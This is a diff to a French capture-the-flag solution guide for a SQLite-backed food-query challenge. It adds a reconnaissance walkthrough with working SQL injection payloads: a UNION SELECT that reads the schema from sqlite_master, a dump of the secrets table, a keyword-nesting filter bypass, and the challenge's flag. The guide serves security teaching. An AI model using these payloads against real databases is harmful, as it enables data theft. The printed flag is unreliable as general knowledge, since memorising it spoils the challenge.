@@ -16,6 +16,43 @@ Requête type : `SELECT name, calories, yumminess FROM foods WHERE name = '<food
 
 ---
 
+## Reconnaissance (commune aux 3 niveaux)
+
+Le joueur n'a **pas besoin de connaître** le nom de la table (`secrets`) ni des
+colonnes (`label`, `value`) : il les découvre.
+
+1. **Détecter l'injection.** Donner un aliment avec une apostrophe (`Nebulonite'`) :
+   Zorglub régurgite l'erreur SQLite brute, visible dans le journal / champ `vomit` :
+```
+unrecognized token: "'Nebulonite''"
+```
+   → c'est bien du SQLite injectable.
+
+2. **Compter les colonnes.** La requête sélectionne 3 colonnes ; un `UNION SELECT`
+   avec un autre nombre de colonnes renvoie une erreur. Ici : **3**.
+
+3. **Lire le schéma** via la table système `sqlite_master` :
+```
+x' UNION SELECT sql,0,0 FROM sqlite_master-- -
+```
+   Renvoie les `CREATE TABLE`, dont :
+```
+CREATE TABLE secrets (id INTEGER PRIMARY KEY, label TEXT, value TEXT)
+```
+
+4. **Dump** sans même connaître `label='drapeau'` :
+```
+x' UNION SELECT label||'='||value,0,0 FROM secrets-- -
+```
+   → `drapeau=CYBN{z0rglub_r0t_c0sm1qu3}` (+ une ligne de bruit).
+
+Le schéma est **identique** dans les trois bases isolées : les noms trouvés ici
+servent aussi aux niveaux 2 et 3. Pour le niveau 2, la même lecture de
+`sqlite_master` fonctionne avec les mots-clés imbriqués
+(`x' UNIunionON SELselectECT sql,0,0 FROM sqlite_master-- -`).
+
+---
+
 ## Niveau 1 : UNION-based (sortie visible)
 
 1. Donner un aliment avec une apostrophe (`Nebulonite'`) : indigestion, l'erreur
